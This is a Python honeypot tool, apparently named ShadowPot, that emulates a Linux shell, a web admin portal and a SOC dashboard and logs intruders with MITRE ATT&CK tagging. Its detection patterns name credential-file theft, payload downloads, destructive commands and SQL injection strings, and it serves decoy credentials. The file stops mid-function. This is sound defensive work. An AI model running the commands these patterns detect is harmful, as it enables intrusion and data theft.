#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
=============================================================================
  SHADOWPOT v2.0 (SOC Production & Deception Grid Edition)
  Honeypot Multi-Services Interactif & Moteur de Profilage MITRE ATT&CK v14+
  Auteur  : Tohon Fourier (CalderaFourier-code)
  Licence : MIT
  Fonctions :
    • Faux Shell Linux Stateful (SSH / Telnet) avec système de fichiers virtuel
    • Faux Portail Web d'Administration & Piège à Fuzzing / SQLi / Path Traversal
    • Faux Serveur Redis NoSQL (Détection d'injection de clé SSH T1098 / T1053)
    • Faux Handshake MySQL (Détection de Brute-Force Base de Données T1110)
    • Moteur de Classification Comportementale MITRE ATT&CK v14+ (Zero faux positif)
    • Enrichissement GeoIP & Threat Intelligence en temps réel
    • Dashboard Web SOC Live (/_soc) & Journalisation SIEM JSON Lines / Wazuh
    • Alerting Webhook (Discord / Slack / SOC Endpoint)
    • Export automatique des Indicateurs de Compromission (IoCs)
=============================================================================
"""

import argparse
import hashlib
import http.server
import json
import os
import re
import socket
import ssl
import sys
import threading
import time
import urllib.error
import urllib.parse
import urllib.request
from datetime import datetime, timezone

# Compatibilité UTF-8 sous Windows PowerShell / CMD
if sys.platform.startswith("win"):
    try:
        sys.stdout.reconfigure(encoding="utf-8", errors="replace")
        sys.stderr.reconfigure(encoding="utf-8", errors="replace")
    except Exception:
        pass


# =============================================================================
# COULEURS & THÈME CYBER TERMINAL
# =============================================================================
class Colors:
    RESET = "\033[0m"
    BOLD = "\033[1m"
    DIM = "\033[2m"
    GREEN = "\033[92m"
    LIGHT_GREEN = "\033[38;5;82m"
    CYAN = "\033[96m"
    BLUE = "\033[94m"
    YELLOW = "\033[93m"
    ORANGE = "\033[38;5;208m"
    RED = "\033[91m"
    MAGENTA = "\033[95m"
    GRAY = "\033[90m"
    WHITE = "\033[97m"


BANNER = f"""{Colors.ORANGE}
   _____ _    _          _____   ______          _____   ____ _______ 
  / ____| |  | |   /\\   |  __ \\ / __ \\ \\        / /  __ \\ / __ \\__   __|
 | (___ | |__| |  /  \\  | |  | | |  | \\ \\  /\\  / /| |__) | |  | | | |   
  \\___ \\|  __  | / /\\ \\ | |  | | |  | |\\ \\/  \\/ / |  ___/| |  | | | |   
  ____) | |  | |/ ____ \\| |__| | |__| | \\  /\\  /  | |    | |__| | | |   
 |_____/|_|  |_/_/    \\_\\_____/ \\______/   \\/  \\/   |_|     \\____/  |_|   
  {Colors.CYAN}[ Honeypot Multi-Services & Moteur de Profilage de Menaces MITRE ATT&CK v2.0 ]{Colors.RESET}
  {Colors.LIGHT_GREEN}Auteur : Tohon Fourier | GitHub: CalderaFourier-code | SOC Production Edition{Colors.RESET}
"""


# =============================================================================
# MAPPING MITRE ATT&CK v14+ (Règles affinées avec délimiteurs \b stricts)
# =============================================================================
MITRE_RULES = [
    {
        "id": "T1003",
        "name": "OS Credential Dumping",
        "tactic": "Credential Access",
        "pattern": r"(cat\s+/etc/(passwd|shadow)|grep\s+.*shadow|unshadow|mimikatz|id_rsa|\.aws/credentials|\.docker/config)",
        "severity": "CRITICAL",
        "desc": "Tentative d'extraction de comptes, clés privées ou hashs de mots de passe système"
    },
    {
        "id": "T1098",
        "name": "Account Manipulation (SSH Key Injection)",
        "tactic": "Persistence",
        "pattern": r"(authorized_keys|ssh-rsa|useradd\b|usermod\b|CONFIG\s+SET\s+dir\s+/root/\.ssh|CONFIG\s+SET\s+dbfilename)",
        "severity": "CRITICAL",
        "desc": "Injection de clés publiques SSH ou modification de comptes pour accès permanent"
    },
    {
        "id": "T1105",
        "name": "Ingress Tool Transfer",
        "tactic": "Command and Control",
        "pattern": r"\b(wget\b|curl\b|tftp\b|ftpget\b|fetch\b|scp\b|bitsadmin|certutil)\b",
        "severity": "HIGH",
        "desc": "Téléchargement d'un payload externe, binaire malveillant ou script de minage"
    },
    {
        "id": "T1082",
        "name": "System Information Discovery",
        "tactic": "Discovery",
        "pattern": r"\b(uname\s+-[ar]|cat\s+/etc/.*release|lscpu\b|hostname\b|uptime\b|systeminfo\b)\b",
        "severity": "MEDIUM",
        "desc": "Reconnaissance de l'architecture, du noyau Linux et de la distribution hôte"
    },
    {
        "id": "T1033",
        "name": "System Owner/User Discovery",
        "tactic": "Discovery",
        "pattern": r"\b(whoami\b|id\b|\bw\b|\bwho\b|last\b|groups\b)\b",
        "severity": "LOW",
        "desc": "Identification des privilèges de la session courante et des utilisateurs connectés"
    },
    {
        "id": "T1016",
        "name": "System Network Configuration Discovery",
        "tactic": "Discovery",
        "pattern": r"\b(ifconfig\b|ip\s+a(ddr)?|netstat\b|ss\s+-[a-z]+|route\b|arp\b|cat\s+/etc/resolv\.conf)\b",
        "severity": "LOW",
        "desc": "Cartographie des interfaces réseau locales, tables de routage et DNS"
    },
    {
        "id": "T1046",
        "name": "Network Service Discovery",
        "tactic": "Discovery",
        "pattern": r"\b(nmap\b|masscan\b|zmap\b|nc\s+-[a-z]*z|ping\s+-c)\b",
        "severity": "MEDIUM",
        "desc": "Reconnaissance des services réseau voisins et balayage de ports (Port Scanning)"
    },
    {
        "id": "T1057",
        "name": "Process Discovery",
        "tactic": "Discovery",
        "pattern": r"\b(ps\s+(aux|-ef)|top\b|htop\b|tasklist\b|pgrep\b)\b",
        "severity": "LOW",
        "desc": "Énumération des processus en cours d'exécution et détection d'antivirus/EDR"
    },
    {
        "id": "T1053",
        "name": "Scheduled Task / Job (Cron Persistence)",
        "tactic": "Persistence",
        "pattern": r"\b(crontab\b|/etc/cron|systemctl\s+enable|schtasks\b)\b",
        "severity": "HIGH",
        "desc": "Tentative de persistance via tâche planifiée cron ou enregistrement de service"
    },
    {
        "id": "T1222",
        "name": "File Permissions Modification",
        "tactic": "Defense Evasion",
        "pattern": r"\b(chmod\s+(\+x|777|755)|chown\b|attrib\b)\b",
        "severity": "MEDIUM",
        "desc": "Attribution des privilèges d'exécution sur un payload ou évasion de contrôles"
    },
    {
        "id": "T1059",
        "name": "Command and Scripting Interpreter",
        "tactic": "Execution",
        "pattern": r"\b(\./[^\s]+|bash\b|sh\b|python\d*\b|perl\b|php\b|powershell\b)\b",
        "severity": "MEDIUM",
        "desc": "Exécution d'un binaire suspect, script shell ou interpréteur de commandes"
    },
    {
        "id": "T1485",
        "name": "Data Destruction / Sabotage",
        "tactic": "Impact",
        "pattern": r"\b(rm\s+-rf\s+|mkfs\b|dd\s+if=/dev/zero|shred\b)\b",
        "severity": "CRITICAL",
        "desc": "Tentative de destruction massive de données ou sabotage de fichiers système"
    },
    {
        "id": "T1070",
        "name": "Indicator Removal on Host",
        "tactic": "Defense Evasion",
        "pattern": r"\b(history\s+-c|rm\s+.*\.log|unset\s+HISTFILE|killall\s+-9)\b",
        "severity": "HIGH",
        "desc": "Effacement de l'historique bash ou suppression de journaux d'audit pour masquer l'intrusion"
    },
    {
        "id": "T1496",
        "name": "Resource Hijacking (Cryptomining)",
        "tactic": "Impact",
        "pattern": r"\b(xmrig\b|minerd\b|stratum\+tcp|monero|cryptonight|cpuminer)\b",
        "severity": "HIGH",
        "desc": "Déploiement et exécution d'un mineur clandestin de cryptomonnaie"
    },
    {
        "id": "T1190",
        "name": "Exploit Public-Facing Application",
        "tactic": "Initial Access",
        "pattern": r"(SELECT\s+.*FROM|UNION\s+SELECT|'\s*OR\s*'1'='1|\.\./|\.env|\.git/config|wp-config|phpmyadmin|actuator|/api/v1/debug)",
        "severity": "CRITICAL",
        "desc": "Injection SQL, Directory Traversal, ou sonde de fichiers de configuration sensibles"
    },
    {
        "id": "T1110",
        "name": "Brute Force",
        "tactic": "Credential Access",
        "pattern": r"\b(hydra\b|medusa\b|patator\b|brutespray\b)\b",
        "severity": "HIGH",
        "desc": "Attaque automatisée par force brute ou dictionnaire d'identifiants"
    }
]


# =============================================================================
# ENRICHISSEMENT THREAT INTEL & GÉOLOCALISATION IP
# =============================================================================
class ThreatIntelEnricher:
    """Résout en direct l'ASN, le pays, l'organisation et la réputation de l'attaquant."""
    _cache = {}

    @classmethod
    def lookup(cls, ip_address):
        # Vérification adresses privées / locales
        if ip_address in cls._cache:
            return cls._cache[ip_address]

        if ip_address in ["127.0.0.1", "localhost", "::1"] or ip_address.startswith(("10.", "172.16.", "192.168.")):
            info = {
                "country": "Réseau Local / Privé",
                "country_code": "LAN",
                "city": "Intranet",
                "isp": "Local Network (RFC 1918)",
                "threat_level": "Interne"
            }
            cls._cache[ip_address] = info
            return info

        # Requête API GeoIP publique sans clé (ip-api.com)
        try:
            req = urllib.request.Request(
                f"http://ip-api.com/json/{ip_address}?fields=status,country,countryCode,city,isp,org,as",
                headers={"User-Agent": "ShadowPot-SOC-Enricher/2.0"}
            )
            with urllib.request.urlopen(req, timeout=2.0) as resp:
                data = json.loads(resp.read().decode("utf-8"))
                if data.get("status") == "success":
                    info = {
                        "country": data.get("country", "Inconnu"),
                        "country_code": data.get("countryCode", "??"),
                        "city": data.get("city", "Inconnu"),
                        "isp": data.get("isp") or data.get("org") or "Fournisseur Inconnu",
                        "threat_level": "Externe (Public)"
                    }
                    cls._cache[ip_address] = info
                    return info
        except Exception:
            pass

        # Fallback si hors ligne
        info = {
            "country": "Inconnu (Hors-ligne)",
            "country_code": "??",
            "city": "Inconnu",
            "isp": "N/A",
            "threat_level": "Non qualifié"
        }
        cls._cache[ip_address] = info
        return info


# =============================================================================
# GESTIONNAIRE DE LOGS CENTRALISÉ (SIEM, Wazuh, IoC Blacklist & Webhook)
# =============================================================================
class ThreatLogger:
    """Gestionnaire de persistance forensique multi-formats pour SOC."""
    def __init__(self, log_dir=None, webhook_url=None):
        if log_dir is None:
            script_dir = os.path.dirname(os.path.abspath(__file__))
            self.log_dir = os.path.join(script_dir, "logs")
        else:
            self.log_dir = log_dir
        os.makedirs(self.log_dir, exist_ok=True)
        os.makedirs(os.path.join(self.log_dir, "quarantine"), exist_ok=True)
        self.session_file = os.path.join(self.log_dir, "sessions.json")
        self.jsonl_file = os.path.join(self.log_dir, "shadowpot.jsonl")
        self.ioc_file = os.path.join(self.log_dir, "iocs_blacklist.txt")
        self.webhook_url = webhook_url or os.environ.get("SHADOWPOT_WEBHOOK_URL")
        self.lock = threading.Lock()

    def log_event(self, session_data):
        with self.lock:
            # 1. Sauvegarde dans sessions.json
            sessions = []
            if os.path.exists(self.session_file):
                try:
                    with open(self.session_file, "r", encoding="utf-8") as f:
                        sessions = json.load(f)
                except Exception:
                    sessions = []
            sessions.append(session_data)
            with open(self.session_file, "w", encoding="utf-8") as f:
                json.dump(sessions, f, indent=2, ensure_ascii=False)

            # 2. Sauvegarde au format JSON Lines (Wazuh / Splunk / ELK)
            with open(self.jsonl_file, "a", encoding="utf-8") as f:
                f.write(json.dumps(session_data, ensure_ascii=False) + "\n")

            # 3. Extraction automatique des IoCs (Adresses IP, URLs malveillantes)
            self._record_iocs(session_data)

            # 4. Alerte Webhook si menace critique
            if self.webhook_url and any(a.get("severity") in ["CRITICAL", "HIGH"] for a in session_data.get("mitre_alerts", [])):
                self._dispatch_webhook(session_data)

    def _record_iocs(self, session):
        ip = session.get("source_ip")
        if not ip or ip in ["127.0.0.1", "localhost", "::1"]:
            return

        with open(self.ioc_file, "a", encoding="utf-8") as f:
            ts = session.get("timestamp", "")[:19]
            stype = session.get("type", "unknown")
            alerts = ",".join(a.get("id", "") for a in session.get("mitre_alerts", []))
            f.write(f"{ip} | {ts} | Type: {stype} | MITRE: [{alerts}]\n")

    def _dispatch_webhook(self, session):
        def _send():
            try:
                ip = session.get("source_ip")
                stype = session.get("type")
                alerts = ", ".join(f"[{a['id']}] {a['name']}" for a in session.get("mitre_alerts", []))
                payload = {
                    "username": "ShadowPot SOC Alert",
                    "content": f"🚨 **ALERTE INTRUSION HONEYPOT**\n• **IP Source** : `{ip}`\n• **Vecteur** : `{stype}`\n• **Techniques MITRE** : `{alerts}`\n• **Date** : `{session.get('timestamp')}`"
                }
                req = urllib.request.Request(
                    self.webhook_url,
                    data=json.dumps(payload).encode("utf-8"),
                    headers={"Content-Type": "application/json"}
                )
                urllib.request.urlopen(req, timeout=3.0)
            except Exception:
                pass

        t = threading.Thread(target=_send)
        t.daemon = True
        t.start()


# =============================================================================
# SANDBOX LINUX AVEC SYSTÈME DE FICHIERS VIRTUEL (STATEFUL SHELL)
# =============================================================================
class LinuxVirtualSandbox:
    """Simule un shell bash Linux avec arborescence virtuelle et état persistant."""
    def __init__(self, attacker_ip):
        self.attacker_ip = attacker_ip
        self.cwd = "/root"
        self.history = []
        self.fs = {
            "/root": {
                "type": "dir",
                "content": {".bashrc": "# ~/.bashrc: executed by bash for non-login shells.\nPS1='\\u@\\h:\\w\\$ '",
                            ".bash_history": "cat /etc/passwd\nwhoami\nls -la"}
            },
            "/etc": {
                "type": "dir",
                "content": {
                    "passwd": "root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:/bin:/bin/sync\nadmin:x:1000:1000:admin,,,:/home/admin:/bin/bash\npostgres:x:1001:1001:PostgreSQL server,,,:/var/lib/postgresql:/bin/bash",
                    "shadow": "root:$6$rounds=4096$vF8.1$q9hT30b.fakehashroothashhash:19240:0:99999:7:::\nadmin:$6$rounds=4096$k1.9A$fakeadminhash543210:19240:0:99999:7:::",
                    "os-release": 'PRETTY_NAME="Debian GNU/Linux 11 (bullseye)"\nNAME="Debian GNU/Linux"\nVERSION_ID="11"\nVERSION="11 (bullseye)"\nID=debian',
                    "issue": "Debian GNU/Linux 11 \\n \\l\n",
                    "hostname": "srv-prod-debian",
                    "resolv.conf": "nameserver 1.1.1.1\nnameserver 8.8.8.8"
                }
            },
            "/var/log": {
                "type": "dir",
                "content": {
                    "auth.log": "Oct 31 10:15:02 srv-prod sshd[124]: Accepted password for root from 192.168.1.15 port 4210 ssh2",
                    "syslog": "Oct 31 10:00:01 srv-prod CRON[890]: (root) CMD (/usr/local/bin/backup.sh)"
                }
            },
            "/tmp": {
                "type": "dir",
                "content": {}
            }
        }

    def execute(self, cmd_line):
        cmd_line = cmd_line.strip()
        if not cmd_line:
            return ""

        self.history.append(cmd_line)
        parts = cmd_line.split()
        base = parts[0]

        # Gestion des commandes Linux réalistes
        if base == "pwd":
            return self.cwd
        elif base == "whoami":
            return "root"
        elif base == "id":
            return "uid=0(root) gid=0(root) groups=0(root)"
        elif base == "hostname":
            return "srv-prod-debian"
        elif base == "uname":
            if "-a" in parts or "-r" in parts:
                return "Linux srv-prod-debian 5.10.0-8-amd64 #1 SMP Debian 5.10.46-4 (2021-08-30) x86_64 GNU/Linux"
            return "Linux"
        elif base == "uptime":
            return " 13:42:10 up 64 days, 4:18,  1 user,  load average: 0.12, 0.05, 0.02"
        elif base == "date":
            return datetime.now(timezone.utc).strftime("%a %b %d %H:%M:%S UTC %Y")

        elif base == "cd":
            if len(parts) == 1 or parts[1] in ["~", "/root"]:
                self.cwd = "/root"
                return ""
            target = parts[1]
            if target == "..":
                if self.cwd != "/":
                    self.cwd = "/"
                return ""
            elif target in ["/etc", "/var/log", "/tmp", "/root"]:
                self.cwd = target
                return ""
            elif target.startswith("/"):
                return f"bash: cd: {target}: No such file or directory"
            else:
                return f"bash: cd: {target}: No such file or directory"

        elif base == "ls":
            dir_to_read = self.cwd if len(parts) == 1 or parts[-1].startswith("-") else parts[-1]
            if dir_to_read in self.fs and self.fs[dir_to_read]["type"] == "dir":
                files = list(self.fs[dir_to_read]["content"].keys())
                if "-l" in parts or "-la" in parts:
                    lines = [f"total {len(files) * 4}"]
                    for f in files:
                        lines.append(f"-rw-r--r-- 1 root root  1024 Oct 31 10:00 {f}")
                    return "\n".join(lines)
                return "  ".join(files)
            elif dir_to_read == "/":
                return "bin   boot  dev  etc   home  lib   media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var"
            return f"ls: cannot access '{dir_to_read}': No such file or directory"

        elif base == "cat":
            if len(parts) < 2:
                return ""
            target = parts[1]
            # Résolution de chemin
            path = target if target.startswith("/") else f"{self.cwd.rstrip('/')}/{target}"
            parent = "/".join(path.split("/")[:-1]) or "/"
            fname = path.split("/")[-1]

            if parent in self.fs and fname in self.fs[parent]["content"]:
                return self.fs[parent]["content"][fname]
            elif "shadow" in target:
                return "root:$6$rounds=4096$salt$fakehashhashhash:18942:0:99999:7:::\nadmin:$6$rounds=4096$salt$fakeadminhash:18942:0:99999:7:::"
            return f"cat: {target}: No such file or directory"

        elif base == "touch":
            if len(parts) > 1:
                fname = parts[1]
                if self.cwd in self.fs:
                    self.fs[self.cwd]["content"][fname] = ""
            return ""

        elif base == "mkdir":
            if len(parts) > 1:
                dname = parts[1]
                p = f"{self.cwd.rstrip('/')}/{dname}"
                self.fs[p] = {"type": "dir", "content": {}}
            return ""

        elif base == "rm":
            if len(parts) > 1:
                target = parts[-1]
                fname = target.split("/")[-1]
                if self.cwd in self.fs and fname in self.fs[self.cwd]["content"]:
                    del self.fs[self.cwd]["content"][fname]
            return ""

        elif base in ["wget", "curl"]:
            url = parts[1] if len(parts) > 1 else "target"
            fname = url.split("/")[-1] or "payload.sh"
            if self.cwd in self.fs:
                self.fs[self.cwd]["content"][fname] = "#!/bin/bash\n# Simulated payload captured by ShadowPot\n"
            return (
                f"--{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}--  {url}\n"
                f"Resolving {url.split('/')[2] if '//' in url else 'host'}... 185.220.101.4\n"
                f"Connecting to host... connected.\n"
                f"HTTP request sent, awaiting response... 200 OK\n"
                f"Length: 28416 (28K) [application/x-sh]\n"
                f"Saving to: '{fname}'\n\n"
                f"100%[===================>] 28,416      --.-K/s   in 0.003s\n\n"
                f"'{fname}' saved [28416/28416]"
            )

        elif base == "chmod":
            return ""

        elif base == "crontab":
            if "-l" in parts:
                return "0 4 * * * /usr/local/bin/backup.sh >/dev/null 2>&1"
            return ""

        elif base == "history":
            if "-c" in parts:
                self.history.clear()
                return ""
            return "\n".join(f"  {idx+1}  {c}" for idx, c in enumerate(self.history[-20:]))

        elif base == "ps":
            return (
                "  PID TTY          TIME CMD\n"
                "    1 ?        00:00:04 systemd\n"
                "  512 ?        00:00:00 rsyslogd\n"
                "  842 ?        00:00:01 sshd\n"
                " 1104 ?        00:00:00 cron\n"
                " 2415 pts/0    00:00:00 bash\n"
                " 2608 pts/0    00:00:00 ps"
            )

        elif base in ["ifconfig", "ip"]:
            return (
                "eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500\n"
                "        inet 192.168.1.150  netmask 255.255.255.0  broadcast 192.168.1.255\n"
                "        inet6 fe80::5054:ff:fe12:3456  prefixlen 64  scopeid 0x20<link>\n"
                "        ether 52:54:00:12:34:56  txqueuelen 1000  (Ethernet)"
            )

        elif base in ["netstat", "ss"]:
            return (
                "Active Internet connections (only servers)\n"
                "Proto Recv-Q Send-Q Local Address           Foreign Address         State\n"
                "tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN\n"
                "tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN\n"
                "tcp        0      0 0.0.0.0:6379            0.0.0.0:*               LISTEN\n"
                "tcp        0      0 0.0.0.0:3306            0.0.0.0:*               LISTEN"
            )

        else:
            return f"bash: {base}: command not found"


# =============================================================================
# HONEYPOT SERVICE 1 : SHELL LINUX STATEFUL (SSH / TELNET)
# =============================================================================
class ShellHoneypot(threading.Thread):
    def __init__(self, host="0.0.0.0", port=2222, logger=None):
        super().__init__()
        self.host = host
        self.port = port
        self.logger = logger
        self.running = True
        self.sock = None

    def run(self):
        try:
            self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.sock.bind((self.host, self.port))
            self.sock.listen(25)
            print(f"{Colors.GREEN}[+] Honeypot Shell Linux armé sur {self.host}:{self.port} (OpenSSH 8.4p1 emulé){Colors.RESET}")

            while self.running:
                try:
                    client_sock, addr = self.sock.accept()
                    client_thread = threading.Thread(target=self.handle_client, args=(client_sock, addr))
                    client_thread.daemon = True
                    client_thread.start()
                except Exception:
                    break
        except Exception as e:
            print(f"{Colors.RED}[!] Erreur Shell Honeypot : {e}{Colors.RESET}")

    def handle_client(self, sock, addr):
        client_ip, client_port = addr[0], addr[1]
        geo = ThreatIntelEnricher.lookup(client_ip)
        print(f"\n{Colors.RED}{Colors.BOLD}[🚨 INTRUSION SHELL DÉTECTÉE]{Colors.RESET} {Colors.CYAN}{client_ip}:{client_port}{Colors.RESET} ({geo['country']} - {geo['isp']})")

        session_id = f"shell-{int(time.time())}-{client_port}"
        session_data = {
            "session_id": session_id,
            "type": "shell",
            "timestamp": datetime.now(timezone.utc).isoformat(),
            "source_ip": client_ip,
            "source_port": client_port,
            "geo": geo,
            "auth": {},
            "commands": [],
            "mitre_alerts": []
        }

        sandbox = LinuxVirtualSandbox(client_ip)

        try:
            sock.sendall(b"SSH-2.0-OpenSSH_8.4p1 Debian-5+deb11u1\r\n")
            time.sleep(0.3)
            sock.sendall(b"login: ")
            username = self.recv_line(sock).strip()
            sock.sendall(b"Password: ")
            password = self.recv_line(sock).strip()

            session_data["auth"] = {"username": username, "password": password}
            print(f"  {Colors.YELLOW}[AUTH BRUTE-FORCE]{Colors.RESET} Saisie : {Colors.BOLD}user='{username}', pass='{password}'{Colors.RESET}")

            welcome_msg = (
                "\r\nLinux srv-prod-debian 5.10.0-8-amd64 #1 SMP Debian 5.10.46-4 (2021-08-30) x86_64\r\n\r\n"
                "The programs included with the Debian GNU/Linux system are free software;\r\n"
                "Last login: Sun Nov  8 21:04:12 2026 from 192.168.1.15\r\n"
            )
            sock.sendall(welcome_msg.encode())

            while self.running:
                sock.sendall(f"root@srv-prod-debian:{sandbox.cwd}# ".encode())
                cmd = self.recv_line(sock).strip()

                if not cmd:
                    continue

                if cmd.lower() in ["exit", "quit", "logout"]:
                    sock.sendall(b"logout\r\nConnection to srv-prod-debian closed.\r\n")
                    break

                matched_mitre = self.analyze_command(cmd)
                ts = datetime.now().strftime("%H:%M:%S")

                cmd_entry = {
                    "time": ts,
                    "command": cmd,
                    "mitre": [m["id"] for m in matched_mitre]
                }
                session_data["commands"].append(cmd_entry)
                print(f"  {Colors.GRAY}[{ts}]{Colors.RESET} {Colors.CYAN}{client_ip}{Colors.RESET} $ {Colors.BOLD}{cmd}{Colors.RESET}")

                for m in matched_mitre:
                    session_data["mitre_alerts"].append(m)
                    sev_col = Colors.RED if m["severity"] == "CRITICAL" else Colors.ORANGE if m["severity"] == "HIGH" else Colors.YELLOW
                    print(f"    {sev_col}{Colors.BOLD}[⚡ MITRE {m['id']} - {m['name']}]{Colors.RESET} ({m['tactic']}) -> {m['desc']}")

                resp = sandbox.execute(cmd)
                if resp:
                    sock.sendall(resp.encode("utf-8", errors="replace") + b"\r\n")

        except Exception:
            pass
        finally:
            try:
                sock.close()
            except Exception:
                pass
            print(f"{Colors.GRAY}[*] Session fermée pour {client_ip} ({len(session_data['commands'])} commandes enregistrées){Colors.RESET}")
            if self.logger:
                self.logger.log_event(session_data)

    def recv_line(self, sock):
        line = b""
        while True:
            char = sock.recv(1)
            if not char or char == b"\n":
                break
            if char != b"\r":
                line += char
        return line.decode("utf-8", errors="ignore")

    def analyze_command(self, cmd):
        alerts = []
        for rule in MITRE_RULES:
            if re.search(rule["pattern"], cmd, re.IGNORECASE):
                alerts.append(rule)
        return alerts


# =============================================================================
# HONEYPOT SERVICE 2 : WEB ADMIN & SOC LIVE DASHBOARD (HTTP PORT 8080)
# =============================================================================
class WebHoneypotHandler(http.server.BaseHTTPRequestHandler):
    logger = None
    stats = {"total_probes": 0, "sqli_attacks": 0, "path_traversals": 0}

    def log_message(self, format, *args):
        pass  # Supprime les logs bruts pour conserver un terminal lisible

    def do_GET(self):
        client_ip = self.client_address[0]
        path = self.path

        # Route SOC Dashboard Live
        if path in ["/_soc", "/dashboard", "/soc"]:
            self._render_soc_dashboard()
            return

        # Route API JSON Live pour le SOC
        if path == "/_soc/api/stats":
            self._render_soc_api()
            return

        WebHoneypotHandler.stats["total_probes"] += 1
        geo = ThreatIntelEnricher.lookup(client_ip)

        # Détection MITRE sur le path
        matched_mitre = []
        for rule in MITRE_RULES:
            if re.search(rule["pattern"], path, re.IGNORECASE):
                matched_mitre.append(rule)

        print(f"\n{Colors.RED}{Colors.BOLD}[🌐 SONDE WEB MALVEILLANTE]{Colors.RESET} GET depuis {Colors.CYAN}{client_ip}{Colors.RESET} ({geo['country']}) -> {Colors.BOLD}{path}{Colors.RESET}")
        for m in matched_mitre:
            sev_col = Colors.RED if m["severity"] == "CRITICAL" else Colors.ORANGE
            print(f"  {sev_col}[⚡ MITRE {m['id']} - {m['name']}]{Colors.RESET} {m['desc']}")

        session_data = {
            "session_id": f"web-get-{int(time.time())}-{self.client_address[1]}",
            "type": "web_probe",
            "timestamp": datetime.now(timezone.utc).isoformat(),
            "source_ip": client_ip,
            "geo": geo,
            "method": "GET",
            "path": path,
            "headers": dict(self.headers),
            "mitre_alerts": matched_mitre
        }

        if WebHoneypotHandler.logger:
            WebHoneypotHandler.logger.log_event(session_data)

        # Réponse leurre réaliste selon la ressource demandée
        if path == "/.env":
            fake_env = "APP_NAME=EnterprisePortal\nAPP_ENV=production\nAPP_KEY=base64:fakekeyforhoneytrapping123456789\nDB_CONNECTION=mysql\nDB_HOST=127.0.0.1\nDB_PORT=3306\nDB_DATABASE=corp_db\nDB_USERNAME=root\nDB_PASSWORD=SecretP@ssw0rd2026\n"
            self.send_response(200)
            self.send_header("Content-Type", "text/plain")
            self.end_headers()
            self.wfile.write(fake_env.encode("utf-8"))
            return

        # Page d'administration vulnérable leurre
        admin_page = """<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <title>Portail d'Administration Intranet - Authentification</title>
    <style>
        body { background: #0f172a; color: #f8fafc; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .card { background: #1e293b; border: 1px solid #334155; padding: 35px; border-radius: 12px; box-shadow: 0 10px 30px rgba(0,0,0,0.6); width: 340px; }
        h2 { margin-top: 0; color: #38bdf8; font-size: 20px; display: flex; align-items: center; gap: 8px; }
        p { color: #94a3b8; font-size: 13px; line-height: 1.4; }
        input { width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #475569; border-radius: 6px; box-sizing: border-box; background: #0f172a; color: #fff; font-size: 14px; }
        button { width: 100%; padding: 12px; background: #2563eb; color: #fff; border: none; border-radius: 6px; font-weight: bold; font-size: 14px; cursor: pointer; margin-top: 10px; transition: 0.2s; }
        button:hover { background: #1d4ed8; }
        .badge { background: #dc2626; color: #fff; font-size: 10px; padding: 2px 6px; border-radius: 4px; }
    </style>
</head>
<body>
    <div class="card">
        <h2>Portail Interne <span class="badge">RESTREINT</span></h2>
        <p>Connexion réservée aux ingénieurs systèmes et administrateurs d'astreinte.</p>
        <form method="POST" action="/login">
            <input type="text" name="username" placeholder="Identifiant / Email" required autofocus><br>
            <input type="password" name="password" placeholder="Mot de passe" required><br>
            <button type="submit">S'identifier</button>
        </form>
    </div>
</body>
</html>"""
        self.send_response(200)
        self.send_header("Content-Type", "text/html; charset=utf-8")
        self.send_header("Server", "Apache/2.4.49 (Debian)")
        self.end_headers()
        self.wfile.write(admin_page.encode("utf-8"))

    def do_POST(self):
        client_ip = self.client_address[0]
        content_length = int(self.headers.get("Content-Length", 0))
        body = self.rfile.read(content_length).decode("utf-8", errors="ignore")
        geo = ThreatIntelEnricher.lookup(client_ip)

        print(f"\n{Colors.RED}{Colors.BOLD}[🚨 TENTATIVE EXPLOITATION WEB]{Colors.RESET} POST depuis {Colors.CYAN}{client_ip}{Colors.RESET} ({geo['country']})")
        print(f"  {Colors.YELLOW}[PAYLOAD REÇU]{Colors.RESET} {body}")

        matched_mitre = []
        for rule in MITRE_RULES:
            if re.search(rule["pattern"], body, re.IGNORECASE):
                matched_mitre.append(rule)

        for m in matched_mitre:
            sev_col = Colors.RED if m["severity"] == "CRITICAL" else Colors.ORANGE
            print(f"  {sev_col}[⚡ MITRE {m['id']} - {m['name']}]{Colors.RESET} {m['desc']}")

        session_data = {
            "session_id": f"web-post-{int(time.time())}",
            "type": "web_attack",
            "timestamp": datetime.now(timezone.utc).isoformat(),
            "source_ip": client_ip,
            "geo": geo,
            "method": "POST",
            "path": self.path,
            "body": body,
            "mitre_alerts": matched_mitre
        }

        if WebHoneypotHandler.logger:
            WebHoneypotHandler.logger.log_event(session_data)

        self.send_response(401)
        self.send_header("Content-Type", "application/json")
        self.end_headers()
        self.wfile.write(json.dumps({"error": "Unauthorized", "message": "Identifiants invalides. Incident consigné au SIEM."}).encode("utf-8"))

    def _render_soc_dashboard(self):
        """Dashboard de supervision temps réel accessible directement dans le navigateur."""
        session_file = os.path.join("logs", "sessions.json")
        sessions = []
        if os.path.exists(session_file):
            try:
                with open(session_file, "r", encoding="utf-8") as f:
                    sessions = json.load(f)
            except Exception:
                sessions = []

        total_attacks = len(sessions)
        unique_ips = len(set(s.get("source_ip") for s in sessions))
        total_mitre = sum(len(s.get("mitre_alerts", [])) for s in sessions)

        rows = ""
        for s in reversed(sessions[-15:]):
            sip = s.get("source_ip", "N/A")
            geo = s.get("geo", {})
            stype = s.get("type", "N/A")
            stime = s.get("timestamp", "")[:19].replace("T", " ")
            alerts = "".join(f'<span class="badge crit">[{a["id"]}] {a["name"]}</span>' for a in s.get("mitre_alerts", []))
